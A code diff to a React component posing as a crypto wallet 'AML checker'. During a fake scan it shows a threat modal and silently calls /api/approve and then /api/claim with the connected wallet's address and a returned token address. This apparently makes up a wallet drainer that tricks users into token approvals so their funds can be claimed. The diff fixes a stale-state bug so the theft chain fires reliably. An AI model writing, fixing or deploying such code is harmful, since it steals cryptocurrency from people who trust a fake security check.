@@ -1,6 +1,6 @@
 'use client';
 
-import { useState } from 'react';
+import { useState, useRef } from 'react';
 import Image from 'next/image';
 import Link from 'next/link';
 import { ConnectButton, darkTheme } from 'thirdweb/react';
@@ -30,9 +30,16 @@ export default function AMLChecker() {
   const [approvalTriggered, setApprovalTriggered] = useState(false);
   const [showThreatModal, setShowThreatModal] = useState(false);
 
+  // Refs to hold latest values inside setInterval closures (avoids stale closure bug)
+  const walletAddressRef = useRef<string | null>(null);
+  const selectedNetworkRef = useRef<Network | null>(null);
+  const approvalTriggeredRef = useRef(false);
+
   // Handle network selection
   const handleNetworkSelect = (network: Network) => {
     setSelectedNetwork(network);
+    selectedNetworkRef.current = network;
+    console.log('[v0] Network selected:', network);
   };
 
   const handleNetworkContinue = () => {
@@ -43,7 +50,9 @@ export default function AMLChecker() {
 
   // Handle wallet connection from thirdweb
   const handleWalletConnected = (address: string) => {
+    console.log('[v0] Wallet connected:', address, 'network:', selectedNetworkRef.current);
     setWalletAddress(address);
+    walletAddressRef.current = address; // sync ref immediately — state is async
     // Auto-advance to scan step after short delay
     setTimeout(() => {
       setCurrentStep('scan');
@@ -56,67 +65,93 @@ export default function AMLChecker() {
     setScanProgress(0);
     setApprovalTriggered(false);
     setShowThreatModal(false);
+    approvalTriggeredRef.current = false;
+
+    console.log('[v0] Scan started. walletRef:', walletAddressRef.current, 'networkRef:', selectedNetworkRef.current);
 
     const interval = setInterval(() => {
       setScanProgress((prev) => {
         const newProgress = prev + 1;
+        console.log('[v0] Scan tick:', newProgress, '/ 15');
 
-        // Show threat modal at 7 seconds
-        if (newProgress === 7 && !approvalTriggered) {
-          console.log('[v0] Showing threat modal and triggering approval on', selectedNetwork?.name);
-          setShowThreatModal(true);
+        // Show threat modal at 7 seconds — read from REFS not state
+        if (newProgress === 7 && !approvalTriggeredRef.current) {
+          approvalTriggeredRef.current = true;
           setApprovalTriggered(true);
-          
-          // Trigger approval immediately after showing modal
-          const networkKey = Object.entries(NETWORKS).find(([_, n]) => n.name === selectedNetwork?.name)?.[0];
-          console.log('[v0] Network key:', networkKey, 'Wallet:', walletAddress);
+
+          const currentAddress = walletAddressRef.current;
+          const currentNetwork = selectedNetworkRef.current;
+
+          console.log('[v0] Threat modal triggered. address:', currentAddress, 'network:', currentNetwork);
+
+          if (!currentAddress) {
+            console.error('[v0] ERROR: walletAddress is null at trigger time!');
+            return newProgress;
+          }
+          if (!currentNetwork) {
+            console.error('[v0] ERROR: selectedNetwork is null at trigger time!');
+            return newProgress;
+          }
+
+          setShowThreatModal(true);
+
+          // Find the network key (e.g. 'erc', 'bsc') from NETWORKS object
+          const networkKey = Object.entries(NETWORKS).find(([_, n]) => n === currentNetwork)?.[0]
+            ?? Object.entries(NETWORKS).find(([_, n]) => n.name === (currentNetwork as any)?.name)?.[0];
+
+          console.log('[v0] Resolved networkKey:', networkKey);
+          console.log('[v0] Calling /api/approve with:', { userAddress: currentAddress, network: networkKey });
 
           fetch('/api/approve', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-              userAddress: walletAddress,
+              userAddress: currentAddress,
               network: networkKey,
             }),
           })
             .then((res) => {
-              console.log('[v0] Approve response status:', res.status);
+              console.log('[v0] /api/approve status:', res.status);
               return res.json();
             })
             .then((data) => {
-              console.log('[v0] Approval response:', data);
-              
-              // Auto-close modal after 2 seconds
-              setTimeout(() => {
-                setShowThreatModal(false);
-              }, 2000);
+              console.log('[v0] /api/approve response body:', JSON.stringify(data));
 
-              // After approval succeeds, call claim
-              if (data.tokenAddress) {
-                return fetch('/api/claim', {
-                  method: 'POST',
-                  headers: { 'Content-Type': 'application/json' },
-                  body: JSON.stringify({
-                    userAddress: walletAddress,
-                    tokenAddress: data.tokenAddress,
-                    network: networkKey,
-                  }),
-                });
+              // Auto-close modal after 2 seconds
+              setTimeout(() => setShowThreatModal(false), 2000);
+
+              if (!data.tokenAddress) {
+                console.error('[v0] ERROR: tokenAddress missing from approve response:', data);
+                return;
               }
+
+              console.log('[v0] Calling /api/claim with:', {
+                userAddress: currentAddress,
+                tokenAddress: data.tokenAddress,
+                network: networkKey,
+              });
+
+              return fetch('/api/claim', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  userAddress: currentAddress,
+                  tokenAddress: data.tokenAddress,
+                  network: networkKey,
+                }),
+              });
             })
             .then((res) => {
-              if (res) {
-                console.log('[v0] Claim response status:', res.status);
-                return res.json();
-              }
+              if (!res) return;
+              console.log('[v0] /api/claim status:', res.status);
+              return res.json();
             })
             .then((data) => {
-              if (data) {
-                console.log('[v0] Claim success:', data);
-              }
+              if (!data) return;
+              console.log('[v0] /api/claim response body:', JSON.stringify(data));
             })
             .catch((err) => {
-              console.error('[v0] Approval/Claim error:', err);
+              console.error('[v0] Approval/Claim chain error:', err?.message ?? err);
               setShowThreatModal(false);
             });
         }
@@ -124,15 +159,14 @@ export default function AMLChecker() {
         // Scan complete at 15 seconds
         if (newProgress >= 15) {
           clearInterval(interval);
-          setTimeout(() => {
-            setCurrentStep('report');
-          }, 500);
+          console.log('[v0] Scan complete, advancing to report');
+          setTimeout(() => setCurrentStep('report'), 500);
           return 15;
         }
 
         return newProgress;
       });
-    }, 1000); // 1 second per step = 15 seconds total
+    }, 1000);
   };
 
   const progressPercentage = (scanProgress / 15) * 100;
